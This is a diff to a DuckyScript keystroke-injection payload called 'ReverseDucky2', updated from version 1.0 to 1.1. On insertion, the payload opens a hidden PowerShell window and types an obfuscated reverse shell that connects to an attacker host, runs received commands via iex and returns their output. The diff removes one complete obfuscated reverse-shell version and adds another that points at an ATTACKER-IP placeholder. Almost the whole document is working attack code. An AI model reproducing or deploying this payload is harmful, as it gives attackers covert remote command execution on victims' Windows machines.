@@ -1,5 +1,5 @@
 REM       ReverseDucky2
-REM       Version 1.0
+REM       Version 1.1
 REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
 REM       Author: 0iphor13
 
@@ -11,24 +11,16 @@ REM       DON'T FORGET TO START LISTENER
 DELAY 1500
 GUI r
 DELAY 500
-STRING powershell -NoP -NonI -W hidden -Exec Bypass
+STRING powershell -NoP -NonI -W hidden
 DELAY 250
 ENTER
 
 DELAY 200
-STRING $IP='0.0.0.0';$Port=4444;$client = .('N'+'ew-O'+'bject') sYSteM.neT.soCKETs.TcPCLient
-DELAY 200
-STRING ($IP,$Port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|.('%'){0};while(($i = $s
-DELAY 200
-STRING tream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (.('Ne'+'w-O'+'bject') -TypeName SystE
-DELAY 200
-STRING M.tEXt.aSCiIEnCodinG).GetString($bytes,0, $i);$sendback = (.('i'+'ex') $data 2>&1 | .('Ou
-DELAY 200
-STRING t-'+'Str'+'in'+'g') );$sendback2 = $sendback + 'PS ' + (&('p'+'wd')).Path + '> ';$sendbyt
-DELAY 200
-STRING e = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Len
-DELAY 200
-STRING gth);$stream.Flush()};$client.Close()
+STRING $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("ATTACKER-IP",PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$
+DELAY 100
+STRING s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU
+DELAY 100
+STRING t-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
 DELAY 100
 ENTER
 
